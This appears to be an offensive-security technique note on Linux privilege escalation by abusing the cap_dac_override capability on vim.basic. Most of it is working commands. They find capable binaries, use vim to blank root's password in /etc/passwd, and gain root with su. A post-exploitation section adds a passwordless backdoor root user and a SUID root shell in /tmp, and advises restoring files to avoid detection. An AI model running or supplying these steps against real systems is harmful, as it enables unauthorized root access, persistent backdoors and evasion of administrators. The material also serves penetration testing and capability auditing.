### 1. Technique Name:

Linux Capabilities – Exploiting `cap_dac_override` for Privilege Escalation
### 2. Summary:

Linux capabilities break down the all-powerful root privileges into discrete units, allowing fine-grained control over what binaries can do. While designed for improved security, misconfigured or overly permissive capabilities can lead to privilege escalation.

One of the most dangerous capabilities is `cap_dac_override`, which allows a binary to bypass standard file read/write/execute permission checks. If assigned to an editor like `vim.basic`, even an unprivileged user can edit protected files such as `/etc/passwd` and remove the root password — enabling a root shell via `su` with no password prompt.
### 3. Conditions / Requirements:

- Binary (e.g., `/usr/bin/vim.basic`) has `cap_dac_override` set    
- Writable access to the binary (or already setcap by root)
- Ability to execute that binary (no sudo needed)
- Target system uses `/etc/passwd` authentication (not fully shadowed)
### 4. Enumeration Steps:
#### A. Enumerate binaries with capabilities:

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
```
#### B. Look for dangerous capabilities like:

- `cap_dac_override`    
- `cap_sys_admin`
- `cap_setuid`, `cap_setgid`
#### C. Inspect specific binary:

```bash
getcap /usr/bin/vim.basic
# Output:
# /usr/bin/vim.basic cap_dac_override=eip
```
#### D. Confirm sensitive file access:

```bash
cat /etc/passwd | head -n 1
# Should return: root:x:0:0:root:/root:/bin/bash
```
### 5. Exploitation Steps:
#### A. Launch vim to edit `/etc/passwd` directly:

```bash
/usr/bin/vim.basic /etc/passwd
# Remove the password field for root (remove the 'x')
```
#### OR B. Perform the change non-interactively:

```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```
#### C. Confirm password field has been removed:

```bash
cat /etc/passwd | head -n 1
# Output: root::0:0:root:/root:/bin/bash
```
#### D. Gain root access via `su`:

```bash
su -
# (No password prompt)
```
### 6. Post-Exploitation Tips:

- Restore `/etc/passwd` to avoid detection    
- Add your own root-level user:

```bash
echo 'haxor::0:0:root:/root:/bin/bash' >> /etc/passwd
```

- Drop a SUID root shell:

```bash
cp /bin/bash /tmp/rootsh
chmod +s /tmp/rootsh
```

- Clear capabilities if possible (requires root):  

```bash
setcap -r /usr/bin/vim.basic
```
### 7. Example / Notes:

- Example of dangerous capability discovered:    

```bash
/usr/bin/vim.basic cap_dac_override=eip
```

- Actual exploit to backdoor root:

```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
su -
```
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #Capabilities